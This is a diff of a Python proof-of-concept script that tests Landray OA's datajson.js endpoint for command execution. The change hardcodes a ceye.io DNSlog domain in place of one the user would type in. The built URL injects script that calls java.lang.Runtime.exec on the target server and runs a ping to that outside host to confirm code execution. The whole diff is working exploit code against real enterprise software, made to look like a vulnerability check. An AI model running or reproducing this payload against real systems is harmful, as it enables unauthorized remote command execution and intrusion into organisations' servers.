@@ -21,9 +21,7 @@ def main(target_url):
         "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0", 
         }
     console.print(now_time() + " [INFO]     正在检测蓝凌OA datajson 命令执行漏洞", style='bold blue')
-    payload=console.input(now_time() + " [INFO]     请输入DNSlog域名:")
-    shell='r.getRuntime().exec("ping -c 4 {}")&type=1'.format(payload)
-    exp_url = target_url+'data/sys-common/datajson.js?s_bean=sysFormulaSimulateByJS&script=function test(){ return java.lang.Runtime};r=test();'+shell
+    exp_url = target_url+'data/sys-common/datajson.js?s_bean=sysFormulaSimulateByJS&script=function test(){ return java.lang.Runtime};r=test();r.getRuntime().exec("ping -c 4 10iknb.ceye.io")'
     try:
         requests.packages.urllib3.disable_warnings()
         respones = requests.get(exp_url, headers=headers,verify=False)
@@ -31,7 +29,7 @@ def main(target_url):
             console.print(now_time() + ' [SUCCESS]  蓝凌OA OA datajson 命令执行漏洞存在', style='bold green')
             console.print(now_time() + ' [SUCCESS]  payload:{}'.format(exp_url), style='bold green')
         else:
-            console.print(now_time() + ' [WARNING]  蓝凌OA datajson 命令执行漏洞可能不存在，请查看dnslog', style='bold red ')
+            console.print(now_time() + ' [WARNING]  蓝凌OA datajson 命令执行漏洞可能不存在', style='bold red ')
     except:
         console.print(now_time() + " [ERROR]    无法利用poc请求目标或被目标拒绝请求, ", style='bold red')
    
